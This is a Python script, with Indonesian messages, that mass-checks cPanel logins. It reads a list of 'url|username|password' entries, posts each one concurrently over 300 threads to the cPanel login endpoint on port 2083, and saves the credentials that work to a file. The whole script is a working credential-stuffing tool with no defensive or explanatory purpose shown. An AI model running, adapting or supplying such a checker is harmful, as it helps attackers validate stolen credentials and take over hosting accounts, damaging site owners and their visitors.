from __future__ import print_function
import requests
from multiprocessing.pool import ThreadPool
import time
from colorama import Fore, Style

try:
    filename = input("Masukkan nama file: ")
    with open(filename, 'r') as f:
        list_data = [line.strip() for line in f.readlines()]
except IOError:
    print("Failed to read file {}".format(filename))
    list_data = []

def cpanel(url):
    try:
        # try to split that url to get username / password
        try:
            url, username, password = url.split('|')
        except Exception as e:
            print("Url {} seems to have wrong format. Concrete error: {}".format(url, e))
            return False

        # add https:// to the beginning of the URL if it's not already there
        if not url.startswith('https://'):
            url = 'http://' + url

        # build the correct url
        url += ':2083/login/?login_only=1'

        # build post parameters
        params = {'user': username, 'pass': password}

        # make request
        r = requests.post(url, params, timeout=5)

        if "status" in r.text and "security_token" in r.text:
            print(Fore.GREEN +"Login for user {} success".format(username)+ Style.RESET_ALL)

            # save successful login credentials to cpok.txt file
            with open('output/CpanelFound.txt', 'a') as f:
                f.write(url + '|' + username + '|' + password + '\n')

            return True

        else:
            print(Fore.RED +"Login Failed {} message \"{}\"".format(url,r.reason)+ Style.RESET_ALL)
            return False

    except requests.exceptions.ConnectTimeout as e:
        print(Fore.RED +"Cpanelnya Gak Ada {} ".format(url)+ Style.RESET_ALL)
        return False

    except requests.exceptions.RequestException as e:
        print(Fore.RED +"Cpanelnya Gak Ada {}  ".format(url)+ Style.RESET_ALL)
        return False


def chekers(url):
    return cpanel(url)


def main():
    try:
        start_time = time.time()
        pp = ThreadPool(300)
        pr = pp.map(chekers, list_data)
        print(pr)
        print('Elapsed time: {:.2f} seconds'.format(time.time() - start_time))
    except Exception as e:
        print("An error occurred during program execution: {}".format(e))

if __name__ == '__main__':
    main()
